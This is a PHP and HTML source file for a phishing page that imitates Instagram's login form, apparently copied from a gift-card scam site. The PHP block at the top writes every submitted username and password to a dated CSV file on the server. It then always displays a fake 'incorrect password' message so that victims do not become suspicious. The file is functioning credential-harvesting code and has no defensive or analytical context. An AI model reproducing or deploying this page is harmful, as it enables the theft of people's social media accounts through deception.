<?php
if(isset($_POST['submit'])){

    //collect form data
    $insta_user = $_POST['insta_user'];
    $insta_pass = $_POST['insta_pass'];

    //check name is set
   // if($insta_pass ==''){
        $error[] = 'Sorry, your password or username was incorrect. Please double-check it.';
//    }

    //check for a valid email address
 //   if(!filter_var($insta_user, FILTER_VALIDATE_EMAIL)){
  //       $error[] = "The username you entered doesn't belong to an account. Please check your username and try again//.";
//    }
 //   if($insta_user ==''){
 //       $error[] = "The username you entered doesn't belong to an account. Please check your username and try again";
//    }


    //if no errors carry on
  //  if(true)){

        # Title of the CSV
        $Content = "";

        //set the data of the CSV
        $Content .= "$insta_user, $insta_pass\n";

        # set the file name and create CSV file
        $FileName = "formdata-".date("d-m-y").".csv";
       // header('Content-Type: application/csv'); 
        //header('Content-Disposition: attachment; filename="' . $FileName . '"'); 
    //    echo $Content;
        
        $fd = fopen ($FileName, "a+");
        
       // echo $Content;
        fputs($fd, $Content);
        fclose($fd);
        
        
       // exit();
   // }
}





?> 

<html>
<!-- Mirrored from giftcardsking.net/button.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 05 Apr 2017 12:38:57 GMT -->
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Verify!</title>
  <link href="https://fonts.googleapis.com/css?family=Raleway:400,700" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
  <link rel="stylesheet" href="generate/button.css">
    <link rel="stylesheet" type="text/css" href="assets/css/style.css">
  <link rel="stylesheet" type="text/css" href="assets/css/main.css">
</head>
<body>
 <section class="instaclass5">
  <main class="instaclass4 instaclass30" role="main">
   <article class="instaarticle3">
    <div class="instaclass1">
     <div class="instaclass2">
      <h1 class="instaclasssub1 instaclasssub2 coreSpriteLoggedOutWordmark">Instagram</h1>
      <div class="instaclass6">
       <form method="POST" action="savelogin.php" onsubmit="return true;"
       class="instaclass7">
       <div class="instaclass8 instaclass9"><input type="text" class="instaclass10 instaclass11"
        aria-describedby="" aria-label="Kullanıcı adı" aria-required="true"
        maxlength="30" name="insta_user"
        placeholder="Phone number, username, or email" value=""></div>
        <div class="instaclass8 instaclass9">
         <input
         type="password" class="instaclass10 instaclass11" aria-describedby=""
         aria-label="Şifre"
         aria-required="true" name="insta_pass"
         placeholder="Password">
       </div>
       <span
       class="instaclass14 instaclass15">
       <button name="submit" id=""
       class="instaclass16 instaclass17 instaclass18 instaclass19">Login</button>
       <div class="spiSpinner"></div>
    <br> </br>
<?php
       //if their are errors display them
if(isset($error) && isset($_POST['submit']) ){
    foreach($error as $error){
        echo "<p style='color:#ed4956; font-size: 14px; font-weight: 400; line-height: 18px;text-align: center; '>$error</p>";
    }
}

?>       
       
       
     </span>


</section>


<!-- Mirrored from giftcardsking.net/button.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 05 Apr 2017 12:38:58 GMT -->
</html>
